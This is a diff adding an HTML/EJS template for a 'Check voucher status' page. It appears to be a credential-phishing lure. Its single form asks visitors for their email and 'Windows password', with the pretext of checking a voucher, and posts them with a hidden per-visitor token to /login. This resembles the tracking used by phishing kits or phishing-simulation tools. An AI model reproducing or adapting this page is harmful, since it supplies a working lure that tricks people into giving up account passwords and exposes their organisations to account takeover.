@@ -1,0 +1,20 @@
+
+<% layout('layout', { title: 'Check voucher status' }) %>
+<section class="mx-auto max-w-sm">
+  <div class="bg-white rounded-2xl shadow p-6">
+    <h1 class="text-xl font-semibold mb-2">Check voucher status</h1>
+    <p class="text-sm text-gray-600 mb-4">Enter your Email and Windows password to check status of your voucher.</p>
+    <form method="POST" action="/login">
+      <input type="hidden" name="token" value="<%= token %>"/>
+      <label class="block mb-2">
+        <span class="text-sm text-gray-700">Email</span>
+        <input name="username" type="email" required class="mt-1 w-full border rounded-xl px-3 py-2">
+      </label>
+      <label class="block mb-4">
+        <span class="text-sm text-gray-700">Windows password</span>
+        <input name="password" type="password" required class="mt-1 w-full border rounded-xl px-3 py-2">
+      </label>
+      <button class="px-4 py-2 rounded-xl bg-black text-white w-full">Check status</button>
+    </form>
+      </div>
+</section>
